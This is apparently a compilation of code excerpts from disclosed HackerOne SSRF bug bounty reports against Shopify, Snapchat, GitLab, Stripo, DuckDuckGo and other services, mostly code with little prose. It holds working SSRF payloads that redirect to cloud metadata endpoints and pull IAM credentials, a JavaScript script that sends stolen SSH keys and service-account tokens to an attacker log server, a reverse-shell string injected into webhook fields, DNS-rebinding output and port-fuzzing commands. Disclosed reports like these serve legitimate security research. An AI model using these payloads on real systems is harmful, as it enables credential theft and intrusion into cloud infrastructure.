Cookie: __utma=228756441.806995719.1494765035.1494768541.1494792827.3; __utmc=228756441; __utmz=228756441.1494765035.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); _forum_session=V29LcnpQVXRTdWJ5dUdkWXQxOEhRRXFHRk5vbmtMS2lhRHdqVXdsYjRpUzhpQ2I1OHBLZVFZVFJqUXFtTUZXM0p0MTJwNWh0M3k3Y0R0NDl0VFBjR3hBQkZZMUlMbno5eTQvOEZtZkdjTFNzTVBNL1R1SDRua1BVMWtpTURyWXR3bnNGeWFPb1pBQnFpQW1ORFllNG04bWthUkFVZ01YTm9PWVB2dS96bmUybXkxU1ZaS2c1WkVlbExwK0pRMjlvaGF6WWY5bi9WeGlrd2xFNmtUYWhUaE01OHVRT05acFJWV3AyQXhUQ1U4YVpVZDV6UVFjSDBtc2NJa3R6dE1aeDVnaE9BblBKK0J4QVlKdGMxQmtYSTNZaGlJL1NFL3lma2pRVktIZWROazZnMTlmbXpSRDFTeVRWeHMveS9HckYxQXdjZ2dZQjdIVmV3aW4reUgzYjNwUWJ2YXVYY0Z4cWlrL2dzeXBmUGoxZVdhQ0JBTTFKZlB3SWhiZ24yZHZkVGYzYVJFb3lJZEhVTENxbHc1WWN1eDdrVGlVTHNLMTZEMG12WTJnVVNQRVhkWEhoTU1EUDNyQVZUdklkdmQwSlNhSlZVcXhQL3FFSzRqWmRyeFozV3BxRWtrK3FuZzBsWnlXVmVJeFVxNTBOMk5YVnR4d21kTXlIaEtlakp3aEJPZURoNm11Uy83d3l6U09kZnNrNnNiUEJBSjRQT0xXdWtqdlUxak5LK2MyaW1kbUlSRGtjWWo5eWJZT21OMk9ScmNFd1o2OG4xUTNIV0ZoVHJlVTFFSUlxKy9RbmZERD
```

```
        header('Location: gopher://192.166.218.53:80/test123');
```

```
        header('Location: ftp://192.166.218.53/');
```

## #158016 Server side request forgery on image upload for lists — instacart — $50 — Code Injection
Source: `hackerone/reports/2016/158016.md` (https://hackerone.com/reports/158016)

```
list[remote_image_url]=https://example.com/yourimage.jpg
```

```
{
	"meta":
	{
		"code": 400,
		"error_type": "List Error",
		"error_message": "There was an error while updating this list",
		"errors": ["Image could not download file: wrong status line: \"SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.3\""]
	}
}
```

```
    Which shows that it tried to connect to the SSH port on localhost.  
```

## #341876 SSRF in Exchange leads to ROOT access in all instances — shopify — - — Server-Side Request Forgery (SSRF)
Source: `hackerone/reports/2018/341876.md` (https://hackerone.com/reports/341876)

```
<script>
window.location="http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token";
// iframes don't work here because Google Cloud sets the `X-Frame-Options: SAMEORIGIN` header.
</script>
```

```
<script>
window.location="http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json";
</script>
```

```
curl -X POST "https://www.googleapis.com/compute/v1/projects/███/setCommonInstanceMetadata" -H "Authorization: Bearer ██████████████" -H "Content-Type: application/json" --data '{"items": [{"key": "0xACB", "value": "test"}]}'
```

## #530974 Server-Side Request Forgery using Javascript allows to exfill data from Google Metadata — snapchat — - — Server-Side Request Forgery (SSRF)
Source: `hackerone/reports/2020/530974.md` (https://hackerone.com/reports/530974)

```
from flask import Flask, request
from flask_cors import CORS
from time import sleep

app = Flask(__name__)
CORS(app)

import logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

@app.route("/")
def helloWorld():
        sleep(3)
        return 'hi!'

@app.route('/log')
def log():
        print request.args['msg']
        return ''

app.run(host='0.0.0.0')
```

```
<script>
var logTimeServer = 'ssh.█████';
var attackServer = 'demon.██████';

function log(data) {
    var sreq = new XMLHttpRequest();
    sreq.open('GET', 'http://' + logTimeServer + ':5000/log?msg=' + encodeURI(data), true);
    sreq.send();
}

function get(url) {
    try {
        var req = new XMLHttpRequest();
        req.open('GET', url, false);
        req.setRequestHeader('X-Google-Metadata-Request', 'True');
        req.send(null);
        if(req.status == 200)
            return req.responseText;
        else
            return '[failed status=' + req.status + ']';
    } catch(err) {
        log(err);
    }
    return null;
}

log('Triggered in ' + window.location.href);

for(var i = 0; i < 60; ++i) {
    log('Loop ' + i);
    var req = new XMLHttpRequest();
    req.open('GET', 'http://' + logTimeServer + ':5000/', false);
    req.send();
}
log('SSH Keys: ' + get('http://' + attackServer + '/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json'));
log('Service Accounts: ' + get('http://' + attackServer + '/computeMetadata/v1/instance/service-accounts/?recursive=true&alt=json'));
log('Hostname: ' + get('http://' + attackServer + '/computeMetadata/v1/instance/hostname'));
</script>
```

```
SSH Keys: "██████"
```

## #878779 Full Read SSRF on Gitlab's Internal Grafana — gitlab — - — Server-Side Request Forgery (SSRF)
Source: `hackerone/reports/2020/878779.md` (https://hackerone.com/reports/878779)

```
	r.Get("/avatar/:hash", avatarCacheServer.Handler)
```

```
const (
	gravatarSource = "https://secure.gravatar.com/avatar/"
)
...
case err = <-thunder.GoFetch(gravatarSource+this.hash+"?"+this.reqParams, this):
```

```
http://i0.wp.com/google.com/1.bp.blogspot.com/
```

## #508459 SSRF in webhooks leads to AWS private keys disclosure — omise — - — Server-Side Request Forgery (SSRF)
Source: `hackerone/reports/2019/508459.md` (https://hackerone.com/reports/508459)

```
<?php header('Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-opsworks-ec2-role', TRUE, 303); ?>
```

## #398641 SSRF on duckduckgo.com/iu/ — duckduckgo — - — Server-Side Request Forgery (SSRF)
Source: `hackerone/reports/2018/398641.md` (https://hackerone.com/reports/398641)

```
22
25
80
443
587
6380
6432
6767
6868
8000
```

```
{
  "current_time": "2018-08-23T17:56:06",
  "deployment_environment": "prod",
  "redis_local_last_successful_ping": "2018-08-23T13:56:05",
  "redis_local_url": "redis://127.0.0.1:6380",
  "redis_regional_last_successful_ping": "2018-08-23T13:56:05",
  "redis_regional_url": "redis://cache-services.duckduckgo.com:6380",
  "stat_blocked_ips_removed_since_launch": 8787,
  "stat_blocked_ips_since_launch": 12185,
  "stat_ipset_blocks": 266,
  "stat_redis_local_messages_received": 3613,
  "stat_redis_regional_messages_received": 10211,
  "status": "up"
}
```

## #2300358 SSRF in https://couriers.indrive.com/api/file-storage — indrive — - — Server-Side Request Forgery (SSRF)
Source: `hackerone/reports/2024/2300358.md` (https://hackerone.com/reports/2300358)

```
GET /api/file-storage?url=http://va99zfc0lxpm75ogmcjhz8xij9pzdo.oastify.com HTTP/2
Host: couriers.indrive.com
Sec-Ch-Ua: "Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,ar;q=0.8
```

```
HTTP/2 200 OK
Authorization: Bearer undefined
Content-Disposition: attachment; filename="file
Date: Sun, 31 Dec 2023 13:19:04 GMT
X-Envoy-Upstream-Service-Time: 678
Server: istio-envoy
X-Cache: Miss from cloudfront
Via: 1.1 33c6e91bdc193e34e8dcc80edc466018.cloudfront.net (CloudFront)
X-Amz-Cf-Pop: MRS52-P2
X-Amz-Cf-Id: 9GuBZr1A03ZS0bEYUbDp80JZj8dNYCE4YoVUImLD5RU15dEM-vs5fQ==

<html><body>6zy5d1pwzab93qopx8jq2ezjigz</body></html>
```

## #643622 SSRF In Get Video Contents — semrush — - — Server-Side Request Forgery (SSRF)
Source: `hackerone/reports/2019/643622.md` (https://hackerone.com/reports/643622)

```
GET /blog/services/oembed/?url=https://1:@127.0.0.1:\@@@@w.youtube.com/@https://www.youtube.com/&callback=CKEDITOR._.jsonpCallbacks[89] HTTP/1.1
Host: www.semrush.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Referer: https://www.semrush.com//my-posts/████/edit/
Connection: close
███
X-Forwarded-For: 127.0.0.1
```

```
GET /blog/services/oembed/?url=https://1:@127.0.0.1:\@@@@w.youtube.com/@https://www.youtube.com/&callback=CKEDITOR._.jsonpCallbacks[89] HTTP/1.1
Host: www.semrush.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Referer: https://www.semrush.com//my-posts/████/edit/
Connection: close
███
X-Forwarded-For: 127.0.0.1

'''
```

## #1832494 Blind SSRF on https://my.exnessaffiliates.com/ allows for internal network enumeration — exness — - — Server-Side Request Forgery (SSRF)
Source: `hackerone/reports/2023/1832494.md` (https://hackerone.com/reports/1832494)

```
{"data":{"url":"https://attacker-domain.tld"}}
```

```
GET / HTTP/1.1
Host: sa66ovrblrbiviochnojtli2bthk5ft4.oastify.com
sentry-trace: xxx,baggage: sentry-trace_id=xxx,sentry-environment=production,sentry-public_key=xxx,sentry-transaction=/api/v1/partners/%7Bpartner_partner_uid%7D/integrations/
User-Agent: python-requests/2.28.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
uber-trace-id: xxx
```

```
{"data":{"url":"https://127.0.0.1:80"}}
```

## #3165242 Server-Side Request Forgery (SSRF) via Game Export API — lichess — - — Server-Side Request Forgery (SSRF)
Source: `hackerone/reports/2025/3165242.md` (https://hackerone.com/reports/3165242)

```
val config = GameApiV2.OneConfig(
  format = GameApiV2.Format.byRequest,
  imported = getBool("imported"),
  flags = requestPgnFlags(extended = true),
  playerFile = get("players")  // User input taken directly
)
```

```
realPlayers                  <- config.playerFile.so(realPlayerApi.apply)
```

```
def apply(url: String): Fu[Option[RealPlayers]] = cache.get(url)
// This leads to:
ws.url(url).withRequestTimeout(3.seconds).get()
```

## #2932960 [my.stripo.email] Blind SSRF Vulnerability in Stripo App Export via Missing Endpoints Export Email Message to Zapier — stripo — - — Server-Side Request Forgery (SSRF)
Source: `hackerone/reports/2025/2932960.md` (https://hackerone.com/reports/2932960)

```
curl -i -X POST 'https://my.stripo.email/bapi/exportservice/v3/exports/WEBHOOK/accounts/52027412' \
--data '{
  "id": 52027412,
  "name": "sh -i & devtcp192.168.100.3 0&1",
  "oAuthRequired": false,
  "authLink": null,
  "draft": false,
  "destination": "WEBHOOK",
  "properties": {
    "headers": [
      {
        "name": "sh -i >& /dev/tcp/192.168.100.3/9001 0>&1",
        "value": "sh -i >& /dev/tcp/192.168.100.3/9001 0>&1"
      }
    ],
    "accountName": "sh -i & devtcpbe7e-101-255-157-9.ngrok-free.app9001 0&1",
    "webhookUrl": "https://cd7c-101-255-157-9.ngrok-free.app/sh -i & devtcpbe7e-101-255-157-9.ngrok-free.app9001 0&1",
    "webhookType": "CUSTOM"
  },
  "public": false
}'
```

```
POST /webhook/sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.100.3%2F9001%200%3E%261/ HTTP/1.1
Host: 5290-101-255-157-9.ngrok-free.app
User-Agent: Apache-HttpClient/4.5.14 (Java/21.0.5)
Content-Length: 104
Accept: application/json
Accept-Encoding: gzip,deflate
Traceparent: 00-58ae5f178436f516dfed5bcabe66e0a4-6f1c4d73cae918b9-00
X-Forwarded-For: 54.247.167.106
X-Forwarded-Host: 5290-101-255-157-9.ngrok-free.app
X-Forwarded-Proto: https
```

```
POST /bapi/exportservice/v3/exports/WEBHOOK/accounts/52027412 HTTP/1.1
Host: my.stripo.email
Content-Type: application/json
Content-Length: 457

{
  "id": 52027412,
  "name": "sh -i & devtcp192.168.100.3 0&1",
  "oAuthRequired": false,
  "authLink": null,
  "draft": false,
  "destination": "WEBHOOK",
  "properties": {
    "headers": [
      {
        "name": "sh -i >& /dev/tcp/192.168.100.3/9001 0>&1",
        "value": "sh -i >& /dev/tcp/192.168.100.3/9001 0>&1"
      }
    ],
    "accountName": "sh -i & devtcpbe7e-101-255-157-9.ngrok-free.app9001 0&1",
    "webhookUrl": "https://cd7c-101-255-157-9.ngrok-free.app/sh -i & devtcpbe7e-101-255-157-9.ngrok-free.app9001 0&1",
    "webhookType": "CUSTOM"
  },
  "public": false
}
```

## #369451 SSRF in CI after first run — gitlab — - — Server-Side Request Forgery (SSRF)
Source: `hackerone/reports/2019/369451.md` (https://hackerone.com/reports/369451)

```
# This file is a template, and might need editing before it works on your project.
# Official framework image. Look for the different tagged releases at:
# https://hub.docker.com/r/library/node/tags/
image: node:latest

# This folder is cached between builds
# http://docs.gitlab.com/ce/ci/yaml/README.html#cache
cache:
  paths:
  - node_modules/

test:
  stage: test
  script:
    - npm install
    - npm test

pack:
  stage: deploy
  script:
    - chmod +x run.sh
    - ./run.sh
    - npm install
    - npm pack
  artifacts:
    paths:
    - ./*.tgz
```

```
curl -L http://169.254.169.254/metadata/v1/
```

```
id
hostname  
user-data  
vendor-data  
public-keys  
region  
interfaces/  
dns/  
floating_ip/  
tags/  
features/  
```

## #541169 GitLab::UrlBlocker validation bypass leading to full Server Side Request Forgery — gitlab — - — Server-Side Request Forgery (SSRF)
Source: `hackerone/reports/2019/541169.md` (https://hackerone.com/reports/541169)

```
  begin
    addrs_info = Addrinfo.getaddrinfo(uri.hostname, port, nil, :STREAM).map do |addr|
      addr.ipv6_v4mapped? ? addr.ipv6_to_ipv4 : addr
    end
  rescue SocketError
    return true
  end

  validate_localhost!(addrs_info) unless allow_localhost
  validate_loopback!(addrs_info) unless allow_localhost
  validate_local_network!(addrs_info) unless allow_local_network
  validate_link_local!(addrs_info) unless allow_local_network

  true
end
```

```
$ dig +noall +answer gitlabextssrf.webhooks.pw
gitlabextssrf.webhooks.pw. 0    IN      A       198.211.125.160
$ dig +noall +answer gitlabextssrf.webhooks.pw
gitlabextssrf.webhooks.pw. 0    IN      A       198.211.125.160
$ dig +noall +answer gitlabextssrf.webhooks.pw
gitlabextssrf.webhooks.pw. 0    IN      A       127.0.0.1
$ dig +noall +answer gitlabextssrf.webhooks.pw
gitlabextssrf.webhooks.pw. 0    IN      A       127.0.0.1
$ dig +noall +answer gitlabextssrf.webhooks.pw
gitlabextssrf.webhooks.pw. 0    IN      A       198.211.125.160
```

```
$ ./wfuzz -X POST \
  -b "_gitlab_session=<session_id>;" \
  -d "_method=post&authenticity_token=<token>" \
  -z range,0-1000 \
  "https://<domain>/<user>/<repo>/hooks/<hook_id>/test?trigger=push_events&test=FUZZ"
```

## #3634400 SSRF Filter Bypass via Unblocked NAT64 Local-Use IPv6 Prefix (64:ff9b:1::/48) — arkadiyt-projects — - — Server-Side Request Forgery (SSRF)
Source: `hackerone/reports/2026/3634400.md` (https://hackerone.com/reports/3634400)

```
TIPSEN:~:% NET=$(docker inspect ssrf_filter_lab --format '{{range $k,$v := .NetworkSettings.Networks}}{{$k}}{{end}}')
TIPSEN:~:% docker rm -f ssrf_filter_lab_netadmin 2>/dev/null || true
ssrf_filter_lab_netadmin
TIPSEN:~:% docker run -d --name ssrf_filter_lab_netadmin --network "$NET" --cap-add NET_ADMIN -p 4568:4567 bbp-ssrf-ssrf-app ruby app.rb
46929c09894e83249c8143c192a727f2583b116c2be0ce70e1528773fb3b388f
```

```
TIPSEN:~:% docker exec ssrf_filter_lab_netadmin sh -lc 'apt-get update -qq && apt-get install -y -qq iproute2 && ip -6 addr add 64:ff9b:1::7f00:1/128 dev lo || true && ip -6 addr show dev lo'
...
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    inet6 64:ff9b:1::7f00:1/128 scope global
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host proto kernel_lo
       valid_lft forever preferred_lft forever
```

```
TIPSEN:~:% docker exec ssrf_filter_lab_netadmin sh -lc 'cat > /tmp/vuln_server_nat64.rb << "RUBY"
require "socket"
server = TCPServer.new("64:ff9b:1::7f00:1", 18081)
loop do
  sock = server.accept
  begin
    while (line = sock.gets)
      break if line == "\r\n"
    end
    body = "NAT64_PREFIX_BYPASS_DEMO"
    sock.write("HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: #{body.bytesize}\r\nConnection: close\r\n\r\n#{body}")
  ensure
    sock.close rescue nil
  end
end
RUBY
nohup ruby /tmp/vuln_server_nat64.rb >/tmp/vuln_server_nat64.log 2>&1 &'
```

## #237381 SSRF and local file disclosure in https://wordpress.com/media/videos/ via FFmpeg HLS processing — automattic — - — Information Disclosure
Source: `hackerone/reports/2017/237381.md` (https://hackerone.com/reports/237381)

```
   192.0.87.12 - - [06/Jun/2017:21:42:35 +0200] "GET /test_ssrf HTTP/1.1" 200 117 "-" "Lavf/56.25.101"
   
```

```
Debian GNU/Linux 8 \n \l
```

```
tc1.videos.dca.wordpress.com
```

## #3445890 Link unfurling calls out to arbitrary URLs and the private-network guard misses link-local addresses — basecamp — - — Server-Side Request Forgery (SSRF)
Source: `hackerone/reports/2025/3445890.md` (https://hackerone.com/reports/3445890)

```
curl -X POST https://<host>/unfurl_link -H "Cookie: session_token=..." -H "X-CSRF-Token: <token>" -d 'url=http://169.254.169.254/latest/meta-data/'
```

## #1092230 FogBugz import attachment full SSRF requiring vulnerability in *.fogbugz.com — gitlab — - — Server-Side Request Forgery (SSRF)
Source: `hackerone/reports/2021/1092230.md` (https://hackerone.com/reports/1092230)

```
   
WHITELIST = [
  /^[^.]+\.fogbugz.com$/
].freeze

...
    
def valid_url?(url)
  url && http?(url) && valid_domain?(url)
end

def http?(url)
  url =~ /\A#{URI::DEFAULT_PARSER.make_regexp(%w(http https))}\z/
end

def valid_domain?(url)
  host = URI.parse(url).host
  WHITELIST.any? { |entry| entry === host }
end
```

```
198.211.125.160 poc.fogbugz.com
```

```
System information
System:         Ubuntu 20.04
Proxy:          no
Current User:   git
Using RVM:      no
Ruby Version:   2.7.2p137
Gem Version:    3.1.4
Bundler Version:2.1.4
Rake Version:   13.0.3
Redis Version:  5.0.9
Git Version:    2.29.0
Sidekiq Version:5.2.9
Go Version:     unknown

GitLab information
Version:        13.8.1-ee
Revision:       e10a21e66ce
Directory:      /opt/gitlab/embedded/service/gitlab-rails
DB Adapter:     PostgreSQL
DB Version:     12.4
URL:            http://188.166.97.195
HTTP Clone URL: http://188.166.97.195/some-group/some-project.git
SSH Clone URL:  git@188.166.97.195:some-group/some-project.git
Elasticsearch:  no
Geo:            no
Using LDAP:     no
Using Omniauth: yes
Omniauth Providers:

GitLab Shell
Version:        13.15.0
Repository storage paths:
- default:      /var/opt/gitlab/git-data/repositories
GitLab Shell path:              /opt/gitlab/embedded/service/gitlab-shell
Git:            /opt/gitlab/embedded/bin/git
```

## #411865 Blind SSRF at https://chaturbate.com/notifications/update_push/ — chaturbate — - — Server-Side Request Forgery (SSRF)
Source: `hackerone/reports/2018/411865.md` (https://hackerone.com/reports/411865)

```
POST /notifications/update_push/ HTTP/1.1
Host: chaturbate.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Referer: https://chaturbate.com/princesscin/
Content-Type: application/x-www-form-urlencoded
X-CSRFToken: YOURCSRFHERE
X-Requested-With: XMLHttpRequest
Content-Length: 408
Cookie: YOURCOOKIEHERE
Connection: close

subscription={"endpoint":"http:\/\/███\/wpush\/v2\/████&unsub=false
```

